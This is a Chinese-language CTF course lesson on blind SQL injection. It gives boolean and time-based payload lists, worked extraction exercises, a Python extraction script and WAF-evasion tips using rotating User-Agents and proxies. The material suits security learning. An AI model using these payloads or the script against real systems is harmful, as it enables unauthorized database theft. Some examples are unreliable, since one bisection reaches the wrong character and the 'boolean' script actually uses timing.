# Day 21：盲注突破——布尔盲注与时间盲注

> **学习目标**：理解盲注原理，掌握布尔盲注和时间盲注的方法，学会在没有错误信息时获取数据
> 
> **学习时长**：2小时
> 
> **难度等级**：⭐⭐⭐⭐⭐

---

## 📚 今日内容概览

1. 盲注原理详解
2. 布尔盲注方法
3. 时间盲注方法
4. 常用函数总结
5. 实战练习
6. 自动化脚本编写

---

## 一、盲注原理详解

### 1.1 什么是盲注

```
盲注是什么：
  在没有错误信息显示的情况下获取数据库信息
  通过分析页面的不同响应来推断数据
  分为布尔盲注和时间盲注两种

原理：
  利用SQL语句的条件判断
  根据条件的真假，页面会有不同的响应
  通过构造大量条件语句，逐字符推断数据

适用场景：
  - 没有错误信息显示
  - 无法使用UNION SELECT
  - 无法使用报错注入
  - 页面只有两种状态（正常/异常）

示例：
  ?id=1 AND 1=1 → 正常显示
  ?id=1 AND 1=2 → 异常或空页面
```

### 1.2 盲注的分类

```
盲注分类：
  1. 布尔盲注：根据页面的布尔状态判断
     - 真：页面正常显示
     - 假：页面异常或不显示
  
  2. 时间盲注：根据响应时间判断
     - 真：执行延时函数，响应慢
     - 假：不执行延时函数，响应快

选择建议：
  - 如果页面有明显的布尔状态差异，用布尔盲注
  - 如果页面没有明显差异，用时间盲注
  - 布尔盲注效率更高，时间盲注更稳定
```

### 1.3 盲注的条件

```
条件：
  1. 存在SQL注入点
  2. 页面有可观察的差异（布尔盲注）
  3. 可以执行SQL语句（时间盲注）
  4. 有足够的时间和耐心

优点：
  - 适用范围广
  - 不需要错误信息
  - 不容易被检测

缺点：
  - 效率低（需要大量请求）
  - 耗时较长
  - 需要自动化工具
```

---

## 二、布尔盲注方法

### 2.1 布尔盲注原理

```
原理：
  利用SQL的条件判断语句
  根据条件的真假，页面返回不同的结果
  通过逐字符比较，推断出数据内容

基本Payload：
  ?id=1 AND SUBSTRING((SELECT database()),1,1)='a'
  
  如果数据库名的第一个字符是'a'，页面正常显示
  如果不是，页面异常显示

步骤：
  1. 判断数据库名长度
  2. 逐字符推断数据库名
  3. 推断表名、字段名、数据
```

### 2.2 判断数据长度

```
Payload格式：
  ?id=1 AND LENGTH((SELECT database()))=N
  
示例：
  ?id=1 AND LENGTH((SELECT database()))=3 → 异常
  ?id=1 AND LENGTH((SELECT database()))=4 → 正常
  结论：数据库名长度为4
  
  ?id=1 AND LENGTH((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()))=20 → 正常
  结论：所有表名的总长度为20
```

### 2.3 逐字符推断

```
Payload格式：
  ?id=1 AND SUBSTRING((SELECT database()),位置,1)='字符'
  
示例：
  推断数据库名第一个字符：
  ?id=1 AND SUBSTRING((SELECT database()),1,1)='a' → 异常
  ?id=1 AND SUBSTRING((SELECT database()),1,1)='b' → 异常
  ...
  ?id=1 AND SUBSTRING((SELECT database()),1,1)='c' → 正常
  结论：数据库名第一个字符是'c'
  
  推断第二个字符：
  ?id=1 AND SUBSTRING((SELECT database()),2,1)='t' → 正常
  结论：数据库名第二个字符是't'
  
  最终推断出数据库名为'ctf'
```

### 2.4 使用ASCII码比较

```
Payload格式：
  ?id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>97
  
示例：
  ?id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>97 → 正常（ASCII码>97）
  ?id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100 → 异常（ASCII码<=100）
  ?id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>99 → 正常（ASCII码>99）
  ?id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100 → 异常（ASCII码<=100）
  结论：ASCII码=100，即字符'd'

优点：
  - 使用二分法可以快速定位字符
  - 比逐个尝试字符效率高
```

### 2.5 布尔盲注Payload总结

```
1. 判断长度：
   ?id=1 AND LENGTH((SELECT database()))=N

2. 逐字符比较（直接比较）：
   ?id=1 AND SUBSTRING((SELECT database()),1,1)='a'

3. 逐字符比较（ASCII码）：
   ?id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>97

4. 获取表名：
   ?id=1 AND SUBSTRING((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()),1,1)='u'

5. 获取字段名：
   ?id=1 AND SUBSTRING((SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME='flag'),1,1)='f'

6. 获取数据：
   ?id=1 AND SUBSTRING((SELECT flag FROM flag),1,1)='f'
```

---

## 三、时间盲注方法

### 3.1 时间盲注原理

```
原理：
  利用SQL的延时函数
  根据响应时间判断条件的真假
  条件为真时执行延时函数，响应变慢
  条件为假时不执行，响应正常

基本Payload：
  ?id=1 AND IF(条件, SLEEP(5), 0)
  
  如果条件为真，页面会延迟5秒响应
  如果条件为假，页面正常响应

常用延时函数：
  - SLEEP(N)：延迟N秒（MySQL）
  - BENCHMARK(N, operation)：执行操作N次
  - WAITFOR DELAY '00:00:05'（SQL Server）
```

### 3.2 判断数据长度

```
Payload格式：
  ?id=1 AND IF(LENGTH((SELECT database()))=N, SLEEP(5), 0)
  
示例：
  ?id=1 AND IF(LENGTH((SELECT database()))=3, SLEEP(5), 0) → 正常响应（时间短）
  ?id=1 AND IF(LENGTH((SELECT database()))=4, SLEEP(5), 0) → 延迟响应（时间长）
  结论：数据库名长度为4
```

### 3.3 逐字符推断

```
Payload格式：
  ?id=1 AND IF(SUBSTRING((SELECT database()),位置,1)='字符', SLEEP(5), 0)
  
示例：
  推断数据库名第一个字符：
  ?id=1 AND IF(SUBSTRING((SELECT database()),1,1)='a', SLEEP(5), 0) → 正常响应
  ?id=1 AND IF(SUBSTRING((SELECT database()),1,1)='b', SLEEP(5), 0) → 正常响应
  ...
  ?id=1 AND IF(SUBSTRING((SELECT database()),1,1)='c', SLEEP(5), 0) → 延迟响应
  结论：数据库名第一个字符是'c'
```

### 3.4 使用ASCII码比较

```
Payload格式：
  ?id=1 AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>97, SLEEP(5), 0)
  
示例：
  ?id=1 AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>97, SLEEP(5), 0) → 延迟响应
  ?id=1 AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>100, SLEEP(5), 0) → 正常响应
  ?id=1 AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>99, SLEEP(5), 0) → 延迟响应
  ?id=1 AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>100, SLEEP(5), 0) → 正常响应
  结论：ASCII码=100，即字符'd'
```

### 3.5 时间盲注Payload总结

```
1. 判断长度：
   ?id=1 AND IF(LENGTH((SELECT database()))=N, SLEEP(5), 0)

2. 逐字符比较（直接比较）：
   ?id=1 AND IF(SUBSTRING((SELECT database()),1,1)='a', SLEEP(5), 0)

3. 逐字符比较（ASCII码）：
   ?id=1 AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>97, SLEEP(5), 0)

4. 获取表名：
   ?id=1 AND IF(SUBSTRING((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()),1,1)='u', SLEEP(5), 0)

5. 获取字段名：
   ?id=1 AND IF(SUBSTRING((SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME='flag'),1,1)='f', SLEEP(5), 0)

6. 获取数据：
   ?id=1 AND IF(SUBSTRING((SELECT flag FROM flag),1,1)='f', SLEEP(5), 0)
```

---

## 四、常用函数总结

### 4.1 字符串函数

```
1. SUBSTRING(str, pos, len)：截取字符串
   - str：要截取的字符串
   - pos：起始位置（从1开始）
   - len：截取长度
   示例：SUBSTRING('hello',1,1) → 'h'

2. MID(str, pos, len)：与SUBSTRING相同
   示例：MID('hello',1,1) → 'h'

3. LEFT(str, len)：从左边截取字符串
   示例：LEFT('hello',1) → 'h'

4. RIGHT(str, len)：从右边截取字符串
   示例：RIGHT('hello',1) → 'o'

5. LENGTH(str)：获取字符串长度
   示例：LENGTH('hello') → 5

6. ASCII(str)：获取第一个字符的ASCII码
   示例：ASCII('a') → 97

7. ORD(str)：与ASCII相同
   示例：ORD('a') → 97
```

### 4.2 条件函数

```
1. IF(condition, true_value, false_value)：条件判断
   示例：IF(1=1, 'yes', 'no') → 'yes'

2. CASE WHEN condition THEN value ELSE other END：多条件判断
   示例：CASE WHEN 1=1 THEN 'yes' ELSE 'no' END → 'yes'
```

### 4.3 延时函数

```
1. SLEEP(N)：延迟N秒（MySQL）
   示例：SLEEP(5) → 延迟5秒

2. BENCHMARK(N, operation)：执行操作N次
   示例：BENCHMARK(1000000, MD5('test')) → 执行100万次MD5计算

3. GET_LOCK(str, timeout)：获取锁（可用于延时）
   示例：GET_LOCK('test', 5) → 尝试获取锁5秒
```

---

## 五、实战练习

### 5.1 练习1：布尔盲注获取数据库名

```
题目：
  URL：http://example.com/user?id=1
  页面只有正常和异常两种状态
  
步骤：
  1. 判断数据库名长度：
     ?id=1 AND LENGTH((SELECT database()))=1 → 异常
     ?id=1 AND LENGTH((SELECT database()))=2 → 异常
     ?id=1 AND LENGTH((SELECT database()))=3 → 异常
     ?id=1 AND LENGTH((SELECT database()))=4 → 正常
     结论：数据库名长度为4
  
  2. 推断第一个字符：
     ?id=1 AND SUBSTRING((SELECT database()),1,1)='a' → 异常
     ?id=1 AND SUBSTRING((SELECT database()),1,1)='b' → 异常
     ?id=1 AND SUBSTRING((SELECT database()),1,1)='c' → 正常
     结论：第一个字符是'c'
  
  3. 推断第二个字符：
     ?id=1 AND SUBSTRING((SELECT database()),2,1)='t' → 正常
     结论：第二个字符是't'
  
  4. 推断第三个字符：
     ?id=1 AND SUBSTRING((SELECT database()),3,1)='f' → 正常
     结论：第三个字符是'f'
  
  5. 推断第四个字符：
     ?id=1 AND SUBSTRING((SELECT database()),4,1)='_' → 正常
     结论：第四个字符是'_'
  
  最终数据库名：ctf_
```

### 5.2 练习2：时间盲注获取表名

```
题目：
  URL：http://example.com/api/data?id=1
  页面没有明显差异，但可以使用时间盲注
  
步骤：
  1. 判断表名总长度：
     ?id=1 AND IF(LENGTH((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()))=15, SLEEP(5), 0) → 延迟响应
     结论：表名总长度为15
  
  2. 推断第一个字符：
     ?id=1 AND IF(SUBSTRING((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()),1,1)='u', SLEEP(5), 0) → 延迟响应
     结论：第一个字符是'u'
  
  3. 继续推断：
     ?id=1 AND IF(SUBSTRING((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()),2,1)='s', SLEEP(5), 0) → 延迟响应
     ...
  
  最终表名：users,flag,logs
```

### 5.3 练习3：ASCII码二分法

```
题目：
  URL：http://example.com/search?q=test
  闭合方式：单引号
  
步骤：
  1. 推断flag的第一个字符：
     ?q=test' AND IF(ASCII(SUBSTRING((SELECT flag FROM flag),1,1))>64, SLEEP(5), 0)-- → 延迟（>64）
     ?q=test' AND IF(ASCII(SUBSTRING((SELECT flag FROM flag),1,1))>96, SLEEP(5), 0)-- → 延迟（>96）
     ?q=test' AND IF(ASCII(SUBSTRING((SELECT flag FROM flag),1,1))>102, SLEEP(5), 0)-- → 异常（<=102）
     ?q=test' AND IF(ASCII(SUBSTRING((SELECT flag FROM flag),1,1))>100, SLEEP(5), 0)-- → 延迟（>100）
     ?q=test' AND IF(ASCII(SUBSTRING((SELECT flag FROM flag),1,1))>101, SLEEP(5), 0)-- → 异常（<=101）
     结论：ASCII码=102，即'f'
  
  2. 继续推断其他字符...
  
  最终flag：flag{blind_injection}
```

---

## 六、自动化脚本编写

### 6.1 Python脚本示例

```
脚本功能：
  自动化布尔盲注
  
代码：
import requests

def boolean_blind(url, query, length):
    result = ""
    for i in range(1, length+1):
        left = 32
        right = 127
        while left <= right:
            mid = (left + right) // 2
            payload = f"1 AND IF(ASCII(SUBSTRING(({query}),{i},1))>{mid}, SLEEP(1), 0)"
            r = requests.get(url + payload, timeout=3)
            if r.elapsed.total_seconds() > 1:
                left = mid + 1
            else:
                right = mid - 1
        result += chr(left)
        print(f"第{i}个字符: {chr(left)}")
    return result

# 使用示例
url = "http://example.com/user?id="
database = boolean_blind(url, "SELECT database()", 4)
print(f"数据库名: {database}")

tables = boolean_blind(url, "SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()", 20)
print(f"表名: {tables}")

注意：
  需要根据实际情况调整超时时间和Payload格式
```

### 6.2 优化建议

```
优化方向：
  1. 添加错误处理
  2. 支持不同的注入类型
  3. 添加进度显示
  4. 支持布尔盲注和时间盲注
  5. 添加多线程加速
  
示例优化：
import requests
import threading

def blind_injection_single_char(url, query, position):
    left = 32
    right = 127
    while left <= right:
        mid = (left + right) // 2
        payload = f"1 AND IF(ASCII(SUBSTRING(({query}),{position},1))>{mid}, SLEEP(1), 0)"
        try:
            r = requests.get(url + payload, timeout=3)
            if r.elapsed.total_seconds() > 1:
                left = mid + 1
            else:
                right = mid - 1
        except:
            right = mid - 1
    return chr(left)
```

---

## 七、常见问题解决

### 7.1 问题1：响应时间不稳定

```
现象：
  时间盲注时响应时间波动较大，难以判断

解决方法：
  1. 增加延时时间：从SLEEP(5)改为SLEEP(10)
  2. 设置合理的超时时间
  3. 多次测试取平均值
  4. 使用BENCHMARK代替SLEEP

示例：
  ?id=1 AND IF(条件, BENCHMARK(1000000, MD5('test')), 0)
```

### 7.2 问题2：被WAF拦截

```
现象：
  大量请求后被WAF拦截

解决方法：
  1. 添加请求间隔
  2. 使用随机User-Agent
  3. 使用代理IP
  4. 减少请求次数（使用二分法）

示例：
  time.sleep(0.5)  # 每次请求间隔0.5秒
```

### 7.3 问题3：页面没有明显差异

```
现象：
  布尔盲注时页面没有明显的正常/异常差异

解决方法：
  1. 使用时间盲注
  2. 检查HTTP状态码
  3. 检查响应长度
  4. 检查响应内容的细微差异

示例：
  if len(r.text) > 1000:  # 通过响应长度判断
      print("条件为真")
  else:
      print("条件为假")
```

---

## 八、今日总结

### 8.1 知识点回顾

```
✅ 盲注原理
  - 布尔盲注：根据页面状态判断
  - 时间盲注：根据响应时间判断

✅ 布尔盲注方法
  - 判断长度：LENGTH()
  - 逐字符推断：SUBSTRING() + 条件判断
  - ASCII码比较

✅ 时间盲注方法
  - 判断长度：IF(LENGTH()=N, SLEEP(5), 0)
  - 逐字符推断：IF(SUBSTRING()='c', SLEEP(5), 0)
  - ASCII码比较

✅ 常用函数
  - SUBSTRING、LENGTH、ASCII、IF、SLEEP

✅ 实战练习
  - 布尔盲注获取数据库名
  - 时间盲注获取表名
  - ASCII码二分法

✅ 自动化脚本
  - Python脚本示例
```

### 8.2 关键记忆点

```
记住这个口诀：

盲注分为布尔和时间，没有错误信息也能玩；
布尔盲注看页面状态，真正常假异常；
时间盲注看响应时间，真慢假快；
逐字符推断用二分，效率高又准！

流程：
  判断长度 → 逐字符推断 → 获取完整数据
```

### 8.3 今日作业

```
必做题：
  1. 完成三个练习题目
  2. 记录盲注步骤
  3. 获取Flag

选做题：
  1. 编写自动化脚本
  2. 练习ASCII码二分法
  3. 在CTFHub找题目练习

提交内容：
  - 步骤记录
  - Flag截图
  - 脚本代码（选做）
```

### 8.4 明日预告

```
Day 22：第三周总复盘

学习内容：
  - SQL注入复习
  - 白纸默写测试
  - 错题复盘
```

---

**恭喜你完成Day 21的学习！明天进行第三周总复盘！** 🎉
